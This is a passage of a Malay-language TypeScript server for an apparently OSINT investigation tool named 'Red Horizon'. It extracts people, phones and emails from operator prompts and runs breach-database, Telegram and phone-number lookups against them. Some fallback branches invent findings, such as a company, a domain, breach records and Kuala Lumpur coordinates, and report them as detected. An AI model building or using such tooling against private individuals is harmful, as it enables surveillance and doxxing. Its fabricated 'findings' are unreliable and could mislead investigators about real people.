            id: phoneId,
            label: p,
            type: 'phone',
            details: `Talian telefon sasaran yang diekstrak daripada arahan komander: ${p}`
          });
          targetActions.push({
            action: 'TRIGGER_PHONE_INTEL',
            description: `Menjalankan semakan pembawa dan risikan nombor ${p}`,
            phoneNumber: p
          });
          targetActions.push({
            action: 'TRIGGER_BREACH_CHECK',
            description: `Menyemak arkib ketirisan data bagi ${p}`,
            term: p
          });
        }

        // 2. Email extraction
        const emailMatch = prompt.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
        if (emailMatch) {
          const em = emailMatch[0];
          const emailId = `email_${now}`;
          extractedNodes.push({
            id: emailId,
            label: em,
            type: 'email',
            details: `Alamat e-mel dikesan: ${em}`
          });
          targetActions.push({
            action: 'TRIGGER_BREACH_CHECK',
            description: `Menyemak pangkalan data ketirisan untuk e-mel ${em}`,
            term: em
          });
        }

        // 3. Company / Organization detection
        const orgMatch = prompt.match(/([A-Z][A-Za-z0-9\s&]+(?:Sdn\s*Bhd|Berhad|Bhd|Holdings|Group|Corp|Enterprises?|Petronas))/i);
        let orgId = '';
        if (orgMatch) {
          const orgName = orgMatch[0].trim();
          orgId = `org_${now}`;
          extractedNodes.push({
            id: orgId,
            label: orgName,
            type: 'organization',
            details: `Entiti korporat / syarikat sasaran: ${orgName}`
          });
        }

        // 4. Person detection
        const personMatch = prompt.match(/(?:Datuk(?:\s+Seri)?|Dato'?(?:\s+Sri)?|Tan\s+Sri|Encik|Puan|Dr\.?|Suspek|individu)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+){1,3})/i);
        let personId = '';
        if (personMatch) {
          const personName = (personMatch[1] || personMatch[0]).trim();
          personId = `person_${now}`;
          extractedNodes.push({
            id: personId,
            label: personName,
            type: 'person',
            details: `Sasaran individu utama siasatan: ${personName}`
          });
          targetActions.push({
            action: 'TRIGGER_OSINT_SCAN',
            description: `Melancarkan imbasan OSINT autonomi ke atas ${personName}`,
            target: personName
          });
        }

        // 5. If explicit target is quoted but not captured yet
        const targetName = explicitTarget || (personId ? '' : (orgId ? '' : ''));
        if (explicitTarget && !extractedNodes.some(n => n.label.toLowerCase() === explicitTarget.toLowerCase())) {
          const isOrg = /sdn|bhd|corp|group|holdings|enterprises|petronas|bank|enterprise/i.test(explicitTarget);
          const isPhone = /^(?:\+?60|0)[1-9][0-9]{7,9}$/.test(explicitTarget);
          const isEmail = explicitTarget.includes('@');
          const tType = isOrg ? 'organization' : (isPhone ? 'phone' : (isEmail ? 'email' : 'person'));
          const tId = `${tType}_${now}`;
          extractedNodes.push({
            id: tId,
            label: explicitTarget,
            type: tType,
            details: `Entiti sasaran utama Fasa ${phaseCode || 'Operasi'}: ${explicitTarget}`
          });

          if (isPhone) {
            targetActions.push({ action: 'TRIGGER_PHONE_INTEL', phoneNumber: explicitTarget });
          } else if (isEmail) {
            targetActions.push({ action: 'TRIGGER_BREACH_CHECK', term: explicitTarget });
          } else {
            targetActions.push({ action: 'TRIGGER_OSINT_SCAN', target: explicitTarget });
          }
        }

        // 6. Phase-Specific Node Expansion
        if (phaseCode === '1.2' || promptLower.includes('ssm') || promptLower.includes('syarikat')) {
          const ssmId = `ssm_org_${now + 1}`;
          const mainTarget = explicitTarget || (extractedNodes[0]?.label) || 'Entiti Berkaitan';
          extractedNodes.push({
            id: ssmId,
            label: `${mainTarget} Holdings Sdn Bhd`,
            type: 'organization',
            details: `Entiti pendaftaran SSM: Syarikat bersekutu aktif dengan nombor pendaftaran korporat sah.`
          });
          if (extractedNodes[0]) {
            extractedLinks.push({
              source: extractedNodes[0].id,
              target: ssmId,
              label: 'pengarah / pemegang saham'
            });
          }
        } else if (phaseCode === '1.4' || promptLower.includes('domain') || promptLower.includes('dns')) {
          const domId = `dom_${now + 1}`;
          const mainTarget = explicitTarget || (extractedNodes[0]?.label) || 'target';
          const cleanDom = mainTarget.toLowerCase().replace(/[^a-z0-9]/g, '') + '.com.my';
          extractedNodes.push({
            id: domId,
            label: cleanDom,
            type: 'domain',
            details: `Domain rasmi dikesan: NS1/NS2 Cloudflare, DNS hosting aktif.`
          });
          if (extractedNodes[0]) {
            extractedLinks.push({
              source: extractedNodes[0].id,
              target: domId,
              label: 'pemilik domain web'
            });
          }
        } else if (phaseCode === '2.1' || promptLower.includes('kebocoran') || promptLower.includes('breach')) {
          const breachId = `breach_${now + 1}`;
          extractedNodes.push({
            id: breachId,
            label: `Arkib Kebocoran Data (Breach DB)`,
            type: 'breach_result',
            details: `Rekod ketirisan ditemui dalam arkib dump kompromi pangkalan data.`
          });
          if (extractedNodes[0]) {
            extractedLinks.push({
              source: extractedNodes[0].id,
              target: breachId,
              label: 'rekod terjejas'
            });
          }
          targetActions.push({
            action: 'TRIGGER_BREACH_CHECK',
            term: explicitTarget || extractedNodes[0]?.label || ''
          });
        } else if (phaseCode === '4.1' || promptLower.includes('geoint') || promptLower.includes('satelit') || promptLower.includes('lokasi')) {
          const locId = `loc_${now + 1}`;
          extractedNodes.push({
            id: locId,
            label: `Menara Pusat Bandaraya, KL`,
            type: 'location',
            details: `Alamat pejabat premis: Lat 3.1578, Lon 101.7123 (Kuala Lumpur)`
          });
          if (extractedNodes[0]) {
            extractedLinks.push({
              source: extractedNodes[0].id,
              target: locId,
              label: 'lokasi operasi fizikal'
            });
          }
          targetActions.push({
            action: 'TRIGGER_GEO_PLOT',
            location: 'Kuala Lumpur',
            lat: 3.1578,
            lon: 101.7123
          });
        } else if (phaseCode === '5.1' || promptLower.includes('sentraliti') || promptLower.includes('dalang')) {
          targetActions.push({
            action: 'TRIGGER_SYNTHESIS'
          });
        }

        // 7. General entity fallback if nothing matched
        if (extractedNodes.length === 0) {
          const cleanTerms = prompt.replace(/(siasat|cari|tolong|tolonglah|analisa|hubungkan|dan|ke|atas|graf|kanvas|laksanakan|fasa)/gi, '').trim();
          const mainTerm = cleanTerms.split(/[,\n]/)[0].trim().substring(0, 40) || 'Sasaran Operasi';
          const genericId = `entity_${now}`;
          extractedNodes.push({
            id: genericId,
            label: mainTerm,
            type: 'entity',
            details: `Entiti sasaran yang didaftarkan daripada arahan operasi komander: "${prompt}"`
          });
        }

        // Link person and org if both exist
        if (personId && orgId) {
          extractedLinks.push({
            source: personId,
            target: orgId,
            label: 'pengarah / pemilik'
          });
        }

        // Link existing selected nodes to newly created nodes
        if (existingNodes.length > 0 && extractedNodes.length > 0) {
          const rootNewNode = extractedNodes[0];
          const closestExisting = existingNodes[0];
          if (rootNewNode.id !== closestExisting.id) {
            extractedLinks.push({
              source: closestExisting.id,
              target: rootNewNode.id,
              label: 'bersekutu / korelasi'
            });
          }
        }

        const actionsToDeploy: any[] = [];
        if (extractedNodes.length > 0) {
          actionsToDeploy.push({
            action: 'CREATE_NODES',
            description: `Menjana ${extractedNodes.length} nod sasaran ke kanvas graf`,
            nodes: extractedNodes
          });
        }
        if (extractedLinks.length > 0) {
          actionsToDeploy.push({
            action: 'LINK_NODES',
            description: `Memautkan ${extractedLinks.length} hubungan korelasi`,
            links: extractedLinks
          });
        }
        // Add tools actions
        actionsToDeploy.push(...targetActions);

        parsedJson = {
          strategic_assessment: `Arahan Taktikal Fasa ${phaseCode || 'Operasi'} Diterima, Komander.\n\nSistem Red Horizon telah memetakan prosedur operasi standard (SOP) bagi sasaran "${explicitTarget || extractedNodes[0]?.label || 'Utama'}", menyusun topologi entiti berkaitan, dan melaksanakan pemetaan korelasi secara langsung ke atas kanvas graf.`,
          tactical_plan: [
            `1. Pengekstrakan entiti sasaran Fasa ${phaseCode || 'Siasatan'}`,
            `2. Penjanaan nod korelasi & pengesahan hubungan`,
            `3. Penyediaan pengesanan jejak perisikan lanjut`
          ],
          actions: actionsToDeploy,
          suggested_followups: phaseCode === '1.1' ? [
            `Laksanakan Fasa 1.2: Periksa pendaftaran syarikat SSM bagi sasaran ini`,
            `Laksanakan Fasa 1.3: Jalankan risikan talian telefon sasaran`,
            `Laksanakan Fasa 2.1: Semak kebocoran data tiris`
          ] : (phaseCode === '1.2' ? [
            `Laksanakan Fasa 3.1: Hubungkan pengarah bersama dan sekutu perniagaan`,
            `Laksanakan Fasa 4.1: Plotkan lokasi pejabat syarikat ke peta satelit`,
            `Laksanakan Fasa 5.1: Jalankan analisis sentraliti kognitif`
          ] : [
            `Siasat pemilikan aset dan akaun bank berkaitan`,
            `Semak pendaftaran syarikat di Suruhanjaya Syarikat (SSM)`,
            `Imbas jejak digital media sosial sasaran`
          ])
        };
      }

      return res.json({
        success: true,
        data: parsedJson,
        webSources: genResult.webSources || [],
        searchQueries: genResult.searchQueries || []
      });
    } catch (err: any) {
      console.error("[AGENTIC COMMAND ERROR]", err);
      return res.status(500).json({
        success: false,
        error: err?.message || "Ralat memproses arahan perisikan autonomi."
      });
    }
  });

  // --- AUTONOMOUS NODE FACT-CHECKING & WEB VERIFICATION ROUTE ---
  app.post("/api/ai/verify-node", async (req, res) => {
      try {
          const { node, canvasContext, customQuery, config, apiKey, openrouterKey, openrouterModel, provider } = req.body || {};
          if (!node || !node.label) {
              return res.status(400).json({ success: false, error: "Node object with a label is required for verification." });
          }

          const configOptions = {
              apiKey: apiKey || config?.apiKey,
              openrouterKey: openrouterKey || config?.openrouterApiKey || config?.apiKey,
              openrouterModel: openrouterModel || config?.openrouterModel || config?.modelName,
              provider: provider || config?.provider
          };

          const result = await serverVerifyNodeWithLiveSearch(node, canvasContext, customQuery, configOptions);
          res.json(result);
      } catch (err: any) {
          console.error("[VERIFY NODE ROUTE ERROR]", err);
          res.status(500).json({ 
              success: false, 
              error: err?.message || "Failed to conduct live web verification on node.",
              verdict: "UNCONFIRMED_GHOST",
              verdictLabel: "Ralat Pemprosesan Carian",
              confidenceScore: 0
          });
      }
  });

  // --- IBM WATSON COGNITIVE RECON & ENTITY-RELATION EXTRACTION ROUTES ---
  app.post("/api/watson/extract", async (req, res) => {
      try {
          const { text, customKey } = req.body || {};
          if (!text || String(text).trim().length === 0) {
              return res.status(400).json({
                  success: false,
                  error: "Teks siasatan diperlukan untuk pengekstrakan kognitif.",
                  entities: [],
                  relations: []
              });
          }

          const result = await extractWatsonEntitiesAndRelations(text, customKey);
          return res.json(result);
      } catch (err: any) {
          console.error("[WATSON EXTRACT ROUTE ERROR]", err);
          return res.status(500).json({
              success: false,
              error: err?.message || "Ralat memproses pengekstrakan kognitif Watson.",
              entities: [],
              relations: []
          });
      }
  });

  app.post("/api/watson/search-extract", async (req, res) => {
      try {
          const { query, customKey } = req.body || {};
          if (!query || String(query).trim().length === 0) {
              return res.status(400).json({
                  success: false,
                  error: "Kata kunci carian diperlukan untuk pengekstrakan berpandukan carian.",
                  entities: [],
                  relations: []
              });
          }

          const result = await searchAndExtractWatsonIntelligence(query, customKey);
          return res.json(result);
      } catch (err: any) {
          console.error("[WATSON SEARCH-EXTRACT ROUTE ERROR]", err);
          return res.status(500).json({
              success: false,
              error: err?.message || "Ralat memproses carian & pengekstrakan Watson.",
              entities: [],
              relations: []
          });
      }
  });

  app.post("/api/watson/analyze-canvas", async (req, res) => {
      try {
          const { selectedNodes, allGraphNodes, allGraphLinks, customInstruction, customKey } = req.body || {};
          if (!selectedNodes || !Array.isArray(selectedNodes) || selectedNodes.length === 0) {
              return res.status(400).json({
                  success: false,
                  error: "Sekurang-kurangnya satu nod sasaran diperlukan untuk analisis kognitif.",
                  entities: [],
                  relations: [],
                  hypothesisAndInsights: [],
                  hiddenCorrelations: []
              });
          }

          const result = await analyzeWatsonCanvasContext(
              selectedNodes,
              Array.isArray(allGraphNodes) ? allGraphNodes : [],
              Array.isArray(allGraphLinks) ? allGraphLinks : [],
              customInstruction,
              customKey
          );
          return res.json(result);
      } catch (err: any) {
          console.error("[WATSON ANALYZE CANVAS ROUTE ERROR]", err);
          return res.status(500).json({
              success: false,
              error: err?.message || "Ralat memproses analisis kognitif nod kanvas.",
              entities: [],
              relations: [],
              hypothesisAndInsights: [],
              hiddenCorrelations: []
          });
      }
  });

  // --- INTEGRATED PHONE INTELLIGENCE & TELEGRAM / NUMVERIFY / SERPAPI ROUTES ---
  app.post("/api/phone/numverify", async (req, res) => {
      try {
          const { phone, apiKey } = req.body || {};
          if (!phone) {
              return res.status(400).json({ valid: false, error: "Nombor telefon diperlukan." });
          }
          const result = await lookupNumVerify(phone, apiKey);
          res.json(result);
      } catch (err: any) {
          console.error("[NUMVERIFY ROUTE ERROR]", err);
          res.status(500).json({ valid: false, error: err?.message || "Ralat memproses semakan NumVerify." });
      }
  });

  app.post("/api/phone/serpapi", async (req, res) => {
      try {
          const { phone, apiKey, query } = req.body || {};
          if (!phone) {
              return res.status(400).json({ results: [], error: "Nombor telefon diperlukan." });
          }
          const result = await lookupSerpApiPhone(phone, apiKey, query);
          res.json(result);
      } catch (err: any) {
          console.error("[SERPAPI ROUTE ERROR]", err);
          res.status(500).json({ results: [], error: err?.message || "Ralat memproses carian SerpApi." });
      }
  });

  app.post("/api/phone/telegram", async (req, res) => {
      try {
          const { phone, apiId, apiHash } = req.body || {};
          if (!phone) {
              return res.status(400).json({ publicProfileFound: false, error: "Nombor telefon diperlukan." });
          }
          const result = await lookupTelegramRecon(phone, apiId, apiHash);
          res.json(result);
      } catch (err: any) {
          console.error("[TELEGRAM RECON ROUTE ERROR]", err);
          res.status(500).json({ publicProfileFound: false, error: err?.message || "Ralat memproses semakan Telegram." });
      }
  });

  app.post("/api/phone/comprehensive-scan", async (req, res) => {
      try {
          const { phone, numverifyKey, serpapiKey, telegramApiId, telegramApiHash } = req.body || {};
          if (!phone) {
              return res.status(400).json({ error: "Nombor telefon diperlukan untuk imbasan menyeluruh." });
          }
          const report = await runComprehensivePhoneIntel(phone, {
              numverifyKey,
              serpapiKey,
              telegramApiId,
              telegramApiHash
          });
          res.json({ success: true, report });
      } catch (err: any) {
          console.error("[PHONE COMPREHENSIVE SCAN ERROR]", err);
          res.status(500).json({ success: false, error: err?.message || "Ralat imbasan menyeluruh nombor telefon." });
      }
  });

  // --- OPENROUTER / NVIDIA NEMOTRON DEDICATED ROUTES ---
  app.get("/api/ai/openrouter-models", async (req, res) => {
      try {
          const resp = await fetch("https://openrouter.ai/api/v1/models", {
              headers: { "User-Agent": "RedHorizon-OSINT/2.5.0" }
          });
          if (!resp.ok) {
              return res.status(resp.status).json({ success: false, error: "Failed to fetch OpenRouter models." });
          }
          const data = await resp.json();
          const allModels = (data && Array.isArray(data.data)) ? data.data : [];
          
          const freeModels = allModels.filter((m: any) => 
              m.id.endsWith(':free') || 
              (m.pricing && (m.pricing.prompt === '0' || m.pricing.prompt === 0) && (m.pricing.completion === '0' || m.pricing.completion === 0))
          );
          
          const nvidiaModels = allModels.filter((m: any) => 
              m.id.includes('nvidia') || m.id.includes('nemotron')
          );

          res.json({
              success: true,
              total: allModels.length,
              freeCount: freeModels.length,
              freeModels: freeModels.map((m: any) => ({
                  id: m.id,
                  name: m.name,
                  context_length: m.context_length,
                  description: m.description,
                  isFree: true
              })),
              nvidiaModels: nvidiaModels.map((m: any) => ({
                  id: m.id,
                  name: m.name,
                  context_length: m.context_length,
                  pricing: m.pricing,
                  isFree: m.id.endsWith(':free') || (m.pricing && m.pricing.prompt === '0')
              }))
          });
      } catch (err: any) {
          console.error("[OPENROUTER MODELS API ERROR]", err);
          res.status(500).json({ success: false, error: err?.message || "Failed to load live OpenRouter models" });
      }
  });

  app.post("/api/ai/openrouter-generate", async (req, res) => {
      try {
          const { prompt, options } = req.body || {};
          if (!prompt) {
              return res.status(400).json({ success: false, error: "Prompt parameter is required." });
          }

          const result = await callOpenRouterChat(prompt, options || {});
          if (result.success && result.text) {
              return res.json({ success: true, text: result.text, modelUsed: result.modelUsed });
          }

          // Fallback to Gemini if OpenRouter fails or key is invalid
          console.warn("[OPENROUTER FALLBACK TO GEMINI]", result.error);
          const fallbackRes = await serverGenerateContent(prompt, options || {});
          res.json({ success: true, text: fallbackRes.text || "", modelUsed: "gemini-3.7-flash (resilient fallback)" });
      } catch (err: any) {
          console.error("[OPENROUTER ROUTE ERROR]", err);
          const fallbackRes = await serverGenerateContent(req.body?.prompt || "", {});
          res.json({ success: true, text: fallbackRes.text || "", modelUsed: "gemini-3.7-flash (resilient fallback)" });
      }
  });

  app.post("/api/ai/openrouter-test", async (req, res) => {
      try {
          const { apiKey, model } = req.body || {};
          const key = (apiKey || "").trim();
          if (!key) {
              return res.status(400).json({
                  success: false,
                  status: "error",
                  error: "Sila masukkan API Key terlebih dahulu."
              });
          }

          const isNvidiaDirect = key.startsWith("nvapi-");
          const testModel = model || (isNvidiaDirect ? "nvidia/llama-3.1-nemotron-70b-instruct" : "nvidia/nemotron-3.5-lightning:free");
          
          const result = await callOpenRouterChat("PING: Sila sahkan sambungan dengan membalas teks pendek 'ONLINE'.", {
              apiKey: key,
              model: testModel,
              temperature: 0.1,
              systemInstruction: "You are an automated connectivity test agent. Reply concisely."
          });

          if (result.success) {
              res.json({
                  success: true,
                  status: "online",
                  message: isNvidiaDirect 
                    ? `Berjaya bersambung ke NVIDIA Direct NIM Engine (${result.modelUsed || testModel})`
                    : `Berjaya bersambung ke OpenRouter Nemotron Engine (${result.modelUsed || testModel})`,
                  modelUsed: result.modelUsed,
                  providerType: isNvidiaDirect ? "NVIDIA NIM Direct" : "OpenRouter",
                  reply: result.text.trim()
              });
          } else {
              res.status(400).json({
                  success: false,
                  status: "error",
                  error: result.error || "Gagal mengesahkan kunci API."
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian sambungan gagal." });
      }
  });

  // --- GOOGLE GEMINI TEST ENDPOINT ---
  app.post("/api/ai/gemini-test", async (req, res) => {
      try {
          const { apiKey, model } = req.body || {};
          const cleanKey = (apiKey || "").trim();
          const modelToTest = model || "gemini-3.7-flash";
          
          const genRes = await serverGenerateContent("PING: Sahkan sambungan dengan membalas teks ringkas 'ONLINE'.", {
              customKey: cleanKey || undefined,
              model: modelToTest
          });

          if (genRes.text && genRes.text.trim().length > 0) {
              const keyCount = cleanKey ? cleanKey.split(',').map((k: string) => k.trim()).filter(Boolean).length : 0;
              res.json({
                  success: true,
                  status: "online",
                  message: cleanKey 
                      ? (keyCount > 1 
                          ? `Berjaya bersambung ke Google Gemini (${keyCount} Kunci Pool Aktif - ${modelToTest})` 
                          : `Berjaya bersambung ke Google Gemini (${modelToTest})`)
                      : `Berjaya bersambung ke Kunci Pelayan Default Gemini (${modelToTest})`,
                  modelUsed: modelToTest,
                  reply: genRes.text.trim()
              });
          } else {
              res.status(400).json({
                  success: false,
                  status: "error",
                  error: "Gagal mengesahkan kunci Google Gemini (respons kosong)."
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian Google Gemini gagal." });
      }
  });

  // --- DEEPSEEK TEST ENDPOINT ---
  app.post("/api/ai/deepseek-test", async (req, res) => {
      try {
          const { apiKey, model } = req.body || {};
          const key = (apiKey || "").trim();
          if (!key) {
              return res.status(400).json({
                  success: false,
                  error: "Sila masukkan DeepSeek API Key terlebih dahulu."
              });
          }
          const targetModel = model || "deepseek-chat";
          const firstKey = key.split(',')[0].trim();
          const resp = await fetch("https://api.deepseek.com/chat/completions", {
              method: "POST",
              headers: {
                  "Authorization": `Bearer ${firstKey}`,
                  "Content-Type": "application/json"
              },
              body: JSON.stringify({
                  model: targetModel,
                  messages: [{ role: "user", content: "PING: Respond with ONLINE" }],
                  max_tokens: 10
              })
          });
          const data = await resp.json().catch(() => null);
          if (resp.ok) {
              const reply = data?.choices?.[0]?.message?.content || "ONLINE";
              res.json({
                  success: true,
                  status: "online",
                  message: `Berjaya bersambung ke DeepSeek (${targetModel})`,
                  modelUsed: targetModel,
                  reply: reply.trim()
              });
          } else {
              res.status(400).json({
                  success: false,
                  error: data?.error?.message || `Ralat HTTP ${resp.status}: Gagal mengesahkan kunci DeepSeek.`
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian sambungan DeepSeek gagal." });
      }
  });

  // --- TAVILY TEST ENDPOINT ---
  app.post("/api/ai/tavily-test", async (req, res) => {
      try {
          const { apiKey } = req.body || {};
          const key = (apiKey || "").trim();
          if (!key) {
              return res.status(400).json({
                  success: false,
                  error: "Sila masukkan Tavily API Key terlebih dahulu."
              });
          }
          const resp = await fetch("https://api.tavily.com/search", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                  api_key: key,
                  query: "test osint ping",
                  max_results: 1
              })
          });
          const data = await resp.json().catch(() => null);
          if (resp.ok) {
              res.json({
                  success: true,
                  status: "online",
                  message: "Berjaya bersambung ke Tavily AI Search API."
              });
          } else {
              res.status(400).json({
                  success: false,
                  error: data?.detail?.error || data?.message || `Ralat Tavily (${resp.status}): Kunci API tidak sah.`
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian sambungan Tavily gagal." });
      }
  });

  // --- RAPIDAPI TEST ENDPOINT ---
  app.post("/api/ai/rapidapi-test", async (req, res) => {
      try {
          const { apiKey } = req.body || {};
          const key = (apiKey || "").trim();
          if (!key) {
              return res.status(400).json({
                  success: false,
                  error: "Sila masukkan RapidAPI Key terlebih dahulu."
              });
          }
          const resp = await fetch("https://breachdirectory.p.rapidapi.com/?func=auto&term=test", {
              method: "GET",
              headers: {
                  "x-rapidapi-key": key,
                  "x-rapidapi-host": "breachdirectory.p.rapidapi.com"
              }
          });
          if (resp.ok) {
              res.json({
                  success: true,
                  status: "online",
                  message: "Berjaya bersambung ke Horizon12 / RapidAPI."
              });
          } else {
              const data = await resp.json().catch(() => null);
              res.status(400).json({
                  success: false,
                  error: data?.message || `Ralat RapidAPI (${resp.status}): Kunci API tidak sah atau tidak diberi kebenaran.`
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian sambungan RapidAPI gagal." });
      }
  });

  // --- NUMVERIFY TEST ENDPOINT ---
  app.post("/api/phone/test-numverify", async (req, res) => {
      try {
          const { apiKey } = req.body || {};
          const key = (apiKey || "").trim();
          if (!key) {
              return res.status(400).json({
                  success: false,
                  error: "Sila masukkan NumVerify API Key terlebih dahulu."
              });
          }
          const result = await lookupNumVerify("+60123456789", key);
          if (result && !result.error) {
              res.json({
                  success: true,
                  status: "online",
                  message: `Berjaya bersambung ke NumVerify API (${result.country_name || 'Aktif'}).`
              });
          } else {
              res.status(400).json({
                  success: false,
                  error: result?.error || "Gagal mengesahkan kunci NumVerify."
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian NumVerify gagal." });
      }
  });

  // --- SERPAPI TEST ENDPOINT ---
  app.post("/api/phone/test-serpapi", async (req, res) => {
      try {
          const { apiKey } = req.body || {};
          const key = (apiKey || "").trim();
          if (!key) {
              return res.status(400).json({
                  success: false,
                  error: "Sila masukkan SerpApi Key terlebih dahulu."
              });
          }
          const resp = await fetch(`https://serpapi.com/search.json?engine=google&q=test&api_key=${encodeURIComponent(key)}`);
          const data = await resp.json().catch(() => null);
          if (resp.ok && !data?.error) {
              res.json({
                  success: true,
                  status: "online",
                  message: "Berjaya bersambung ke SerpApi Google Dorking Engine."
              });
          } else {
              res.status(400).json({
                  success: false,
                  error: data?.error || "Kunci SerpApi tidak sah."
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian SerpApi gagal." });
      }
  });

  // --- TELEGRAM RECON CREDENTIALS TEST ENDPOINT ---
  app.post("/api/phone/test-telegram", async (req, res) => {
      try {
          const { apiId, apiHash } = req.body || {};
          if (!apiId || !apiHash) {
              return res.status(400).json({
                  success: false,
                  error: "Sila masukkan Telegram API ID dan API Hash."
              });
          }
          const result = await lookupTelegramRecon("+60123456789", apiId, apiHash);
          if (result && !result.error) {
              res.json({
                  success: true,
                  status: "online",
                  message: "Kredensial Telegram MTProto disahkan aktif."
              });
          } else {
              res.status(400).json({
                  success: false,
                  error: result?.error || "Gagal mengesahkan kredensial Telegram."
              });
          }
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message || "Ujian Telegram gagal." });
      }
  });

  // Vite middleware for development
  const isProd = process.env.NODE_ENV === "production" || __appDirname.endsWith('dist') || __appDirname.includes('/dist');
  
  if (!isProd) {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // In production, locate the static build folder
    const distPath = fs.existsSync(path.join(process.cwd(), 'dist', 'index.html'))
      ? path.join(process.cwd(), 'dist')
      : fs.existsSync(path.join(__appDirname, 'index.html'))
        ? __appDirname
        : path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    const ip = getLocalIp();
    console.log(`Server running on http://${ip}:${PORT}`);
  });
}

startServer();
